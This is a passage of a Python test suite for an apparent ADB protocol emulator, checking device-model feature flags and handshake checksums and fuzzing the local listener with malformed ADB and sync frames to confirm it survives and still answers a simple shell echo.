    for m in MODELS:
        feats = set(m.features.split(","))
        assert "ls_v2" not in feats and "apex" not in feats
        assert "fixed_push_symlink_timestamp" not in feats
        if m.sdk <= 25:
            assert feats == {"shell_v2", "cmd"}
            assert m.version == 0x01000000 and m.banner_nul
        else:
            assert "stat_v2" in feats and m.version == 0x01000001 and not m.banner_nul


async def test_checksum_is_zero_only_when_both_sides_skip_it(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        sdk = h.sensor.device.model.sdk
        c = await h.raw()
        await c.send(A_CNXN, 0x01000001, 4096, b"host::\0")
        head = await c.reader.readexactly(24)
        _, _, _, length, _, _ = struct.unpack("<6I", head)
        banner = await c.reader.readexactly(length)
        assert (banner.endswith(b"\0")) == (sdk <= 25)
        await c.send(A_OPEN, 1, 0, b"shell,v2,raw:true\0")
        head = await c.reader.readexactly(24)
        cmd, _, _, length, crc, _ = struct.unpack("<6I", head)
        assert cmd == A_OKAY and length == 0 and crc == 0  # empty payload: both are zero
        await c.send(A_OPEN, 2, 0, b"shell:echo hi\0")
        crcs = []
        for _ in range(4):
            head = await c.reader.readexactly(24)
            cmd, _, _, length, crc, _ = struct.unpack("<6I", head)
            data = await c.reader.readexactly(length) if length else b""
            if cmd == A_WRTE and data.startswith(b"hi"):
                crcs.append((crc, sum(data)))
                break
        assert crcs and (crcs[0][0] == 0) == (sdk >= 28)


async def test_random_wire_fuzz_with_edge_frames(make_harness) -> None:  # type: ignore[no-untyped-def]
    rng = random.Random(99)
    async with make_harness(message_timeout=0.5, handshake_timeout=0.5) as h:
        cn = pack(A_CNXN, 0x01000001, 4096, b"host::\0")
        sync_edges = [
            b"SEND" + struct.pack("<I", 4) + b"a,b,",
            b"DATA" + struct.pack("<I", 70_000) + b"x",
            b"STA2" + struct.pack("<I", 0),
            b"STA2" + struct.pack("<I", 2000) + b"x" * 10,
            b"LST2" + struct.pack("<I", 1) + b"/",
            b"DONE" + struct.pack("<I", 1),
            b"RECV" + struct.pack("<I", 3) + b"///",
            b"QUIT" + struct.pack("<I", 0),
            b"\xff" * 9,
        ]
        for i in range(80):
            r, w = await asyncio.open_connection("127.0.0.1", h.port)
            kind = i % 8
            if kind == 0:
                blob = pack(A_OPEN, 1, 0, b"x")[: rng.randrange(1, 24)]  # truncated header
            elif kind == 1:
                blob = rng.randbytes(rng.randrange(1, 200))  # bad magic
            elif kind == 2:
                blob = HEADER.pack(A_CNXN, 1, 1, 5000, 0, A_CNXN ^ 0xFFFFFFFF)  # oversized pre-CNXN
            elif kind == 3:
                blob = (
                    pack(A_CNXN, 0x01000000, 4096, b"host::\0")
                    + HEADER.pack(A_OPEN, 1, 0, 3, 99, A_OPEN ^ 0xFFFFFFFF)
                    + b"abc"
                )
            else:
                body = b"".join(rng.choice(sync_edges) for _ in range(rng.randrange(1, 12)))
                blob = cn + pack(A_OPEN, 1, 0, b"sync:\0") + pack(A_WRTE, 1, 1, body)
            w.write(blob)
            await w.drain()
            await asyncio.sleep(0.01)
            w.close()
        await asyncio.sleep(1.5)
        assert h.sensor.stats()["connections"] == 0
        c = await h.connect()
        assert (await c.shell("echo ok")).strip() == "ok"
